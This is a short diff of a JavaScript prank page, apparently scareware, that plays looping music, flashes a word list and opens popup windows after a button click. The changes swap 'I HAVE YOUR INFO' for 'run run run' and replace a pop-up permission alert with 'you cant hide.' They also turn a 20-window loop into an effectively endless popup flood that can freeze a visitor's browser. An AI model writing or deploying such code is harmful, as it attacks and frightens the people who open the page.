@@ -34,7 +34,7 @@
     const music = new Audio('music.mp3');
     music.loop = true;
 
-    const wordlist = ['I', 'HAVE', 'YOUR', 'INFO :D'];
+    const wordlist = ['run', 'run', 'run', 'RUN :D'];
     let index = 0;
     let nextAn = 1;
     let popups = [];
@@ -67,7 +67,7 @@
       const testPop = window.open('', '', 'width=200,height=100');
 
       if (!testPop) {
-        alert("Please enable pop-ups in your browser to continue.");
+        alert("you cant hide.");
         return;
       } else {
         testPop.close();
@@ -102,7 +102,7 @@
         index = (index + 1) % wordlist.length;
       }, 300);
 
-      for (let i = 0; i < 20; i++) openNewWindow();
+      for (let i = 0; i < 9999999999999999999999; i++) openNewWindow();
     }
 
     startBtn.addEventListener('click', startMadness);
